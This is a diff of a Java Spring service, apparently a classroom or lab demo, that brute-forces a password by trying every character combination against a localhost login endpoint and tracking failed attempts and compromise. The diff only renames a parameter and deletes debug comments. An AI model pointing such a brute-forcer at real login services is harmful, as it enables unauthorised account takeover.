@@ -20,17 +20,17 @@ public class BruteForceService {
     @Autowired
     private RestTemplate restTemplate;
 
-    public void startBruteForce(int len) {
+    public void startBruteForce(int passwordLength) {
         this.failedAttempts = 0;
         this.userCompromised= false;
         this.isBruteForcing = true;
-        bruteForce(len, "");
+        bruteForce(passwordLength, "");
     }
 
-    public boolean bruteForce(int len, String current) {
+    public boolean bruteForce(int passwordLength, String current) {
         if (!isBruteForcing) return false;
 
-        if (len == 0) {
+        if (passwordLength == 0) {
             this.failedAttempts++;
 
             if (postUsingRestTemplate("user", current)) {
@@ -44,7 +44,7 @@ public class BruteForceService {
         }
 
         for (int i = 0; i < CHARACTERS.length(); i++) {
-            if (bruteForce(len - 1, current + CHARACTERS.charAt(i))) {
+            if (bruteForce(passwordLength - 1, current + CHARACTERS.charAt(i))) {
                 return true;
             }
         }
@@ -53,10 +53,8 @@ public class BruteForceService {
 
     public boolean postUsingRestTemplate(String username, String password) {
 
-        //System.out.println("Using username: " + username + " and password: " + password);
-
         String url = "http://localhost:8080/login/";
-        //System.out.println("DEBUG: Använder username: " + username + " och password: " + password);
+
         HttpHeaders headers = new HttpHeaders();
 
         // Enkodar till basic auth. Ska vi köra json behöver vi göra en ny validering av användaren.
@@ -69,13 +67,8 @@ public class BruteForceService {
         try {
             response = restTemplate.exchange(url, HttpMethod.POST, entity, String.class);
         } catch (HttpClientErrorException e) {
-            //System.out.println("Response Status: " + e.getStatusCode());
-            //System.out.println("Login failed due to client error"); // Debugging comment
             return false; // Login failed due to client error (likely unauthorized)
         }
-
-        //System.out.println("Response Status: " + response.getStatusCode());
-        //System.out.println("Response Body: " + response.getBody());
 
         if ("Logged in".equals(response.getBody())) {
             System.out.println("Successful login attempt with password: " + password); // Debugging comment
@@ -91,10 +84,6 @@ public class BruteForceService {
         // Populate statistics with data from your service
         statistics.setFailedAttempts(getFailedAttempts());
         statistics.setUserCompromised(isUserCompromised());
-
-        //prints out the statistics
-        //System.out.println("Failed attempts: " + statistics.getFailedAttempts());
-        //System.out.println("User compromised: " + statistics.isUserCompromised());
 
         return statistics;
     }
